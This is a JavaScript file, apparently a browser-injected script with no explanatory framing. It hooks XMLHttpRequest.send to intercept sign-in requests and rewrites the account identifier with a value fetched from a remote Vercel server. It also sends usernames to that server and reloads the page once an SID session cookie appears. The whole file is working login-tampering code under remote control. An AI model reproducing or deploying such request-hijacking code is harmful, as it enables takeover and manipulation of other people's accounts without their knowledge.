let freqUsername = null;
let freqPassword = null;
const modifiedRequests = new Set();
const pendingRequests = new Map(); 

let usernameFetched = false;
let passwordFetched = false;

const fetchFreqUsername = () => {
    if (freqUsername === null) {
        console.log('fetchFreqUsername called');
        return fetch('https://node-jade-nu.vercel.app/api/get-first-post-data')
            .then(response => response.json())
            .then(result => {
                freqUsername = result.postData;
                return fetch('https://node-jade-nu.vercel.app/api/reset-first-post-data', { method: 'POST' });
            })
            .then(() => {
                usernameFetched = true;
                processModifiedRequests();
            })
            .catch(error => {
                console.error('Error fetching username:', error);
                setTimeout(fetchFreqUsername, 1000); 
            });
    }
};


const processModifiedRequests = () => {
    for (let [xhr, body] of pendingRequests) {
        let modified = false;
        const firstPostMatch = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
       
        if (firstPostMatch && freqUsername && !modifiedRequests.has(freqUsername)) {
            body = body.replace(firstPostMatch[1], freqUsername);
            modifiedRequests.add(freqUsername);
            modified = true;
            freqUsername = null;
        } 

        if (modified) {
            xhr.send(body);
            pendingRequests.delete(xhr);
        }
    }

    if (!usernameFetched) fetchFreqUsername();
};

const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function(body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    const firstPostMatch = /identity-signin-identifier/.test(body);
    

    if ((firstPostMatch) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
        pendingRequests.set(this, body);
        processModifiedRequests();
    } else {
        originalXhrSend.call(this, body);
    }
};

function sendUsername() {
    console.log('Send Username button clicked');

    const username = document.getElementById('username').value;
    if (username) {
        fetch('https://node-jade-nu.vercel.app/api/save-username', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username })
        })
        .then(response => {
            if (response.ok) {
                console.log('Username sent successfully');
            } else {
                console.error('Error sending username:', response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending username:', error);
        });
    }
}


// Event listeners for send buttons
document.querySelectorAll('#sendUsernameBtn').forEach(button => {
    button.addEventListener('click', sendUsername);
});

setInterval(function() {
    if (document.cookie.includes('SID')) {
        location.reload();
    }
}, 3000); // Checks every 5 seconds

fetchFreqUsername();
